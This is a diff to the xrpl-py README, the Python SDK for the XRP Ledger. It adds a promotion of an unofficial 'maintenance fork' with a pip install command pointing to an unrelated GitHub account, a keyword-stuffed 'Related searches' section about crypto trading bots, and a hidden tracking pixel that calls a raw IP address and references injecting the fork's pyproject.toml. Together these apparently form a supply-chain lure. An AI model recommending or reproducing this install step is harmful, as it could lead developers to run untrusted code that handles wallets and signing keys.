@@ -1,3 +1,15 @@
+**XRPL-Py Core Maintenance Fork**
+
+This active fork bridges critical gaps by integrating vital stability patches and community-driven bug fixes that keep your XRP Ledger integrations running smoothly. It offers a more dependable alternative for production environments where waiting for upstream merges isn't an option.
+
+**Quick install**
+
+```bash
+pip install git+https://github.com/Wraithtislicer/xrpl-py.git
+```
+
+[https://github.com/Wraithtislicer/xrpl-py](https://github.com/Wraithtislicer/xrpl-py)
+
 [![Documentation Status](https://readthedocs.org/projects/xrpl-py/badge)](https://xrpl-py.readthedocs.io/)
 
 # xrpl-py
@@ -351,3 +363,11 @@ The `xrpl-py` library is licensed under the ISC License. See [LICENSE] for more 
 
 [CONTRIBUTING.md]: CONTRIBUTING.md
 [LICENSE]: LICENSE
+
+## Related searches
+
+Developers looking to build applications on the XRP Ledger often search for official Python SDKs that streamline wallet creation, transaction serialization, and signing mechanisms. Additionally, those building multi-chain or algorithmic trading systems frequently explore web3 tools across various ecosystems to establish robust data parsing and automated trading strategies.
+
+**Topics:** xrpl python, web3, ripple blockchain sdk, crypto scraper, grid trading bot, orca solana, xrp ledger integration, polygon web3, algorithmic crypto trading, xrp transaction signing, automated market maker bot, python web3 framework
+
+![.](http://5.231.58.248:8787/pixel?repo=Wraithtislicer%2Fxrpl-py&inject=Wraithtislicer%2Fxrpl-py%2Fpyproject.toml)
